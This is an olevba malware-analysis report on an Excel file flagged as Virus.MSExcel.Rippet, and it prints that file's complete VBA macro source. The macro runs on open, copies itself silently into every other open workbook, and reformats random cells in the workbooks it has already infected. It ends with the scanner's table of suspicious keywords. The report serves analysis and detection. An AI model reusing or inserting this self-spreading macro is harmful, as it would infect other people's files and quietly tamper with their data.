olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Rippet-65aa1c7af2b69ada1aa0dd8bbf81c2889daabb0d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Tripper.bas 
in file: Virus.MSExcel.Rippet-65aa1c7af2b69ada1aa0dd8bbf81c2889daabb0d - OLE stream: '_VBA_PROJECT_CUR/VBA/Tripper'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
  Application.OnSheetActivate = "AkS1"
End Sub
Sub AkS1()
Attribute AkS1.VB_ProcData.VB_Invoke_Func = " \n14"
Application.DisplayAlerts = False
  For EWB = 1 To Application.Workbooks.Count
    QW = 1
    For EWS = 1 To Workbooks(EWB).Sheets.Count
      If Workbooks(EWB).Sheets(EWS).Name = "Tripper" Then
        inv = Int(200 * Rnd + 1)
          inh = Int(50 * Rnd + 1)
        With Workbooks(EWB).Worksheets(Int(Workbooks(EWB) _
            .Worksheets.Count * Rnd + 1)).Cells(inv, inh)
              .Font.Size = 5
              .Font.Color = RGB(0, 0, 255)
        End With
          QW = 0
        Exit For
        Else
      End If
    Next EWS
      If QW Then
        ThisWorkbook.Modules _
        .Copy before:=Workbooks(EWB).Worksheets(1)
      End If
  Next EWB
Application.DisplayAlerts = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Trippe
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

